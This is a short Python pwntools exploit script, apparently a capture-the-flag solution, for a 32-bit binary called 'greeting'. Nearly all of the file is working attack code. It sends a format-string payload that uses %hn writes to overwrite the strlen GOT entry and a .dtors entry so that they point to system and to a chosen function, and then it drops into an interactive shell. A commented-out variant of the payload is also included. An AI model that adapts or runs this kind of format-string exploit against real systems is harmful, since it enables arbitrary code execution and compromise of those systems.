#!/usr/bin/env python3

from pwn import *

exe = ELF("./greeting")
libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")

context.binary = exe


def conn():
    if args.LOCAL:
        return process([exe.path])
    else:
        return remote("addr", 1337)


def main():
    r = conn()

    dtors_addr = 0x08049934
    strlen_addr = 0x08049a54

    function_addr = 0x080485ed
    system_addr = 0x08048490

    gdb.attach(r, gdbscript = 'b *0x804864f')
    
    '''
    If you have time to spare and are lazy, but I mean, hey, it works
    r.sendline(p32(dtors_addr) + p32(strlen_addr) + "%34259x" + "%23$hn" + "%134479523x" + "%24$n")
    '''

    payload = p32(strlen_addr + 2) + p32(strlen_addr) + p32(dtors_addr) + "%2022x" + "%23$hn" + "%31884x" + "%24$hn" + "%349x" + "%25$hn"
    r.sendline(payload)
    print len(payload)

    r.interactive()


if __name__ == "__main__":
    main()